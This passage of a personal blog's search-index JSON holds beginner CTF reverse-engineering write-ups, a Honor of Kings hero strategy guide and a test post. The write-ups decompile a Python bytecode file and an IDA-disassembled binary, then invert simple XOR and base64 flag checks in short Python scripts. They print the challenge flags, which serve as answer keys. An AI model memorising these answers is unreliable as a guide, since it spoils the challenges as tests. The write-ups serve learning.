0x05.python-trade下载附件发现是pyc文件，利用python反编译工具 在线工具 得到代码如下： import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong' 反编译的意思大概就是反着来呗！ 如上代码运用for循环进行异或和加法操作最终得到base64字符串 那我们就将base64字符串在for循环里进行减法和异或操作不就得到flag了嘛？ 简单脚本如下： import base64 buf &#x3D; base64.b64decode(&#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;) &#x2F;&#x2F;利用python语法讲base64码直接转，再也不用借助工具啦flag &#x3D; &#39;&#39;for i in buf: i &#x3D;i-16 i &#x3D;i^32 flag &#x3D;flag+chr(i) print(flag) 嘻嘻嘻得到flag nctf{d3c0mpil1n9_PyC} 0x06.game直接拖入ida中，恶心人的是我没有在这道题中发现main函数，导致我无法运用万能快捷键F5 这让我如何是好，不管了shift+F12试一试 哇！我真幸运 发现了done!!! the flag is我就感觉这里一定有flag 鼠标点击flag 然后跳转到这一行 鼠标右键点击 List cross references to 并按下F5 (这一步说实话菜鸡也不太懂，于是参考了别人的博客) 终于找到了原代码！！！ sub_45A7BE(\"done!!! the flag is \"); v59 = 18; v60 = 64; v61 = 98; v62 = 5; v63 = 2; v64 = 4; v65 = 6; v66 = 3; v67 = 6; v68 = 48; v69 = 49; v70 = 65; v71 = 32; v72 = 12; v73 = 48; v74 = 65; v75 = 31; v76 = 78; v77 = 62; v78 = 32; v79 = 49; v80 = 32; v81 = 1; v82 = 57; v83 = 96; v84 = 3; v85 = 21; v86 = 9; v87 = 4; v88 = 62; v89 = 3; v90 = 5; v91 = 4; v92 = 1; v93 = 2; v94 = 3; v95 = 44; v96 = 65; v97 = 78; v98 = 32; v99 = 16; v100 = 97; v101 = 54; v102 = 16; v103 = 44; v104 = 52; v105 = 32; v106 = 64; v107 = 89; v108 = 45; v109 = 32; v110 = 65; v111 = 15; v112 = 34; v113 = 18; v114 = 16; v115 = 0; v2 = 123; v3 = 32; v4 = 18; v5 = 98; v6 = 119; v7 = 108; v8 = 65; v9 = 41; v10 = 124; v11 = 80; v12 = 125; v13 = 38; v14 = 124; v15 = 111; v16 = 74; v17 = 49; v18 = 83; v19 = 108; v20 = 94; v21 = 108; v22 = 84; v23 = 6; v24 = 96; v25 = 83; v26 = 44; v27 = 121; v28 = 104; v29 = 110; v30 = 32; v31 = 95; v32 = 117; v33 = 101; v34 = 99; v35 = 123; v36 = 127; v37 = 119; v38 = 96; v39 = 48; v40 = 107; v41 = 71; v42 = 92; v43 = 29; v44 = 81; v45 = 107; v46 = 90; v47 = 85; v48 = 64; v49 = 12; v50 = 43; v51 = 76; v52 = 86; v53 = 13; v54 = 114; v55 = 1; v56 = 117; v57 = 126; v58 = 0; for ( i = 0; i &lt; 56; ++i ) &#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u; &#125; return sub_45A7BE(\"%s\\n\"); 上边代码是求flag的过程，大概意思是它将程序分为了两个数组，一组为v2到v58另一组为v59~v115 将第一个数组与第二个数组异或再将值赋予第一个数组，然后第一个数组再和0x13异或，最后把第一个数组转化为字符串即为flag 思路既然懂了，那我们直接上代码： a&#x3D;[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0]b&#x3D;[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0]i&#x3D;0c&#x3D;&#39;&#39;while (i&lt;56): a[i]^&#x3D;b[i] a[i]^&#x3D;19 c&#x3D;c+chr(a[i]) i&#x3D;i+1print(c) 得到flag zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"从入门到进阶之狄仁杰","slug":"王者荣耀","date":"2020-06-06T15:55:24.703Z","updated":"2020-06-07T01:50:25.608Z","comments":true,"path":"2020/06/06/王者荣耀/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/06/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80/","excerpt":"狄仁杰神级攻略","text":"狄仁杰神级攻略 王者荣耀狄仁杰玩法攻略 许多玩王者荣耀的朋友都知道狄仁杰这个英雄吧，这个英雄不但伤害高，而且保命能力还很强，非常适合用来上分。那么我们该怎么玩好这个英雄呢？我们就得需要了解这个英雄的装备、铭文、技能、小技巧之类的。下面我就为大家讲解一下吧！ 开局准备装备推荐：急速战靴、末世、无尽战刃、破晓、红叉、复活甲，这套装备建议顺风出装，不但伤害足，而且可以利用贤者的庇护和名刀进行秒换装，大大的提高了生存能力! 第二套出装：急速战靴、末世、无尽战刃、破晓、魔女斗篷、不祥征兆，这套装备不但伤害足，而且坦度还可以。这套装备建议逆风翻盘出装，敌方刺客一套秒不了，可以利用吸血反手打团！ 铭文推荐：5个夺萃、5个狩猎、10个鹰眼、5个祸源和5个无双，5个无双的暴击效果配上无尽战刃暴击效果达到上限，夺萃可以提高自己的续航能力，鹰眼和祸源增加自身的伤害。 召唤师技能推荐：闪现，闪现这个召唤技能非常适合没有位移的英雄，无论是追击敌人或者逃跑都非常不错，并且操作熟练还可以使用大闪。 技能解析被动技能：通过普攻可以增加自身的攻速和移速，这样我们可以在团战或者对线前把被动先叠起来。~AAA A就完了 三个技能描述见下图，这里我就不再多做叙述啦 小技巧下面是最最最细节的小技巧，想在巅峰赛排位赛乱杀的小伙伴们，一定要多多练习好啊 1.可以利用一技能和二技能的打击效果来探草丛，草丛里面有人会触发技能的打击效果。（啪啪啪的声音）高端局要多利用一技能进行探草，免得草丛里蹦出五个大汉！！！ 2.还可以利用三次普通攻击的穿透效果在防御塔外面攻击到防御塔 ~还是那句话AAAAA A就完了！ 3.二技能释放的时候有短暂的无敌，这个时间比较短，释放得当可以躲掉防御塔的伤害和敌人的伤害。 4.闪现这个技能对于狄仁杰来说，上限极高。多利用大招加闪现进行开团或者留人。这里说一下如何操作。。其实很简单的，如图一大招向自己的身后放，在释放的一瞬间，按住闪现，并且方向要指向想要定住的敌方英雄（如图二）。 注意事项 前期可以叫打野多支援你，射手发育起来团队才有足够的伤害。 多利用技能来探草丛可以减少自己被蹲。","categories":[{"name":"game","slug":"game","permalink":"https://github.com/gha01un/gha01un.github.io/categories/game/"}],"tags":[{"name":"王者荣耀","slug":"王者荣耀","permalink":"https://github.com/gha01un/gha01un.github.io/tags/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80/"}],"author":"H1un"},{"title":"HELLO CTF","slug":"HELLO CTF","date":"2020-06-03T15:29:39.512Z","updated":"2020-06-06T17:28:40.380Z","comments":true,"path":"2020/06/03/HELLO CTF/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/03/HELLO%20CTF/","excerpt":"HELLO WORLD","text":"HELLO WORLD 这只是一个测试 flag{gu0_ha0_1un_1s_ctfer}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"}],"categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"},{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"},{"name":"杂谈","slug":"杂谈","permalink":"https://github.com/gha01un/gha01un.github.io/categories/%E6%9D%82%E8%B0%88/"},{"name":"笔记","slug":"笔记","permalink":"https://github.com/gha01un/gha01un.github.io/categories/%E7%AC%94%E8%AE%B0/"},{"name":"game","slug":"game","permalink":"https://github.com/gha01un/gha01un.github.io/categories/game/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"},{"name":"Web","slug":"Web","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Web/"},{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"},{"name":"plan","slug":"plan","permalink":"https://github.com/gha01un/gha01un.github.io/tags/plan/"},{"name":"PWN","slug":"PWN","permalink":"https://github.com/gha01un/gha01un.github.io/tags/PWN/"},{"name":"Crypto","slug":"Crypto","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Crypto/"},{"name":"王者荣耀","slug":"王者荣耀","permalink":"https://github.com/gha01un/gha01un.github.io/tags/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80/"}]}